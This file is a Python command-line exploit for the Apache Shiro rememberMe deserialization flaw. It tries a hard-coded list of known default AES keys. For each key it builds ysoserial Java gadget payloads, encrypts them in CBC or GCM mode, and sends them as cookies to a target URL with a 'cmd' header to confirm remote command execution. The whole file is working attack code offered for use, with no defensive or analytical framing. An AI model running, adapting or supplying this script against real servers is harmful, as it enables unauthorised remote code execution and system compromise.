# -*- coding: utf-8 -*
#author：Escape
import json
import os
import time
import sys
import base64
import uuid
import argparse
import subprocess
import requests
from Crypto.Cipher import AES




def parser_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help\r\n       All parameters are required")
    sys.exit()

def payload(target,ciphertype,assembly):    
    #assembly = 'CommonsCollections2Echo'
    #assembly = 'CommonsBeanutils1Echo'
    
    keys = [
"fCq+/xW488hMTCD+cmJ3aQ==",
"4AvVhmFLUs0KTA3Kprsdag==",
"3AvVhmFLUs0KTA3Kprsdag==",
"Z3VucwAAAAAAAAAAAAAAAA==",
"2AvVhdsgUs0FSA3SDFAdag==",
"wGiHplamyXlVB11UXWol8g==",
"kPH+bIxk5D2deZiIxcaaaA==",
"1QWLxg+NYmxraMoxAXu/Iw==",
"ZUdsaGJuSmxibVI2ZHc9PQ==",
"L7RioUULEFhRyxM7a2R/Yg==",
"6ZmI6I2j5Y+R5aSn5ZOlAA==",
"r0e3c16IdVkouZgk1TKVMg==",
"5aaC5qKm5oqA5pyvAAAAAA==",
"bWluZS1hc3NldC1rZXk6QQ==",
"a2VlcE9uR29pbmdBbmRGaQ==",
"WcfHGU25gNnTxTlmJMeSpw==",
"3AvVhmFLUs0KTA3Kprsdag==",
]

    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', assembly, 'echo'], stdout=subprocess.PIPE)
    file_body = popen.stdout.read()

    for key in keys:    
        if ciphertype == 'GCM':
            base64_ciphertext = GCMCipher(key,file_body)
            try:
                header = {'cmd': 'echo testShiro'}
                #print(len(base64_ciphertext.decode()))
                r = requests.get(target, headers=header, cookies={'rememberMe': base64_ciphertext.decode()},timeout=20,verify=False, stream=True)
                #r.text
                if 'testShiro' in r.text:
                    print("key is "+key+"\r\npayload is rememberMe="+base64_ciphertext.decode())
                    #break
            except Exception as e:
                print(str(e))
                
        
        if ciphertype == 'CBC':
            base64_ciphertext = CBCCipher(key,file_body)
            try:
                header = {'cmd': 'echo testShiro'}
                r = requests.get(target, headers=header, cookies={'rememberMe': base64_ciphertext.decode()},timeout=20,verify=False, stream=True)
                #r.text
                if 'testShiro' in r.text:
                    print("key is "+key+"\r\npayload is rememberMe="+base64_ciphertext.decode())
                    break
            except Exception as e:
                print(str(e))                
    
    
#1.4.2及以上版本使用GCM加密
def GCMCipher(key,file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
    ciphertext, tag = cipher.encrypt_and_digest(file_body) 
    ciphertext = ciphertext + tag   
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext


def CBCCipher(key,file_body):
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-U', '--url', help="target url", required=True)
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    parser.add_argument('-M', '--gadget', help='ysoserial gadget', required=True)
    args = parser.parse_args()
    if '://' not in args.url:
        target = 'https://%s' % args.url if ':443' in args.url else 'http://%s' % args.url
    else:
        target = args.url

    payload(target, args.ciphertype, args.gadget)
  


